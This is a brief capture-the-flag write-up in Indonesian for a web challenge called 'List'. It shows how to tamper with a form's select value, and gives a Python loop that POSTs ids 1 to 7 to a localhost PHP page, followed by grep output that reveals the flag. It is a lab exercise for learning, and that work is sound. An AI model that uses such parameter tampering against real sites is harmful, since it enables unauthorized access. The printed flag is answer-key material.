<h1><b>List</h1></b>
<pre>
List
</pre>
</b><h3>Solution</h3></b>
<p>Ganti value pada list super hero dengan inspect element, isi value selain yang sudah ada dan submit, cari hingga dapat value berapa=flag</p>

```python
import requests

URL = 'http://localhost/CTF/Web_warning/Web-Warning-8.php'
for i in range(1,8):
    data = {'id':str(i),
            "Submit":"Submit"}
    res = requests.post(URL,data=data).text
    print(res)
```
<p>Karena hasilnya banyak, eksekusi pada terminal dengan grep</p>

```console
root@Python:/home/venom/Downloads# python3 Challenge.py | grep -i ctf
<p class='success'>Hellow iam VenomCTF{l00k_1n_d33p_direct0ry}</p></form>
root@Python:/home/venom/Downloads# 
```
<p>Flag terdapat pada list ke 7</p>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{l00k_1n_d33p_direct0ry}
</pre>
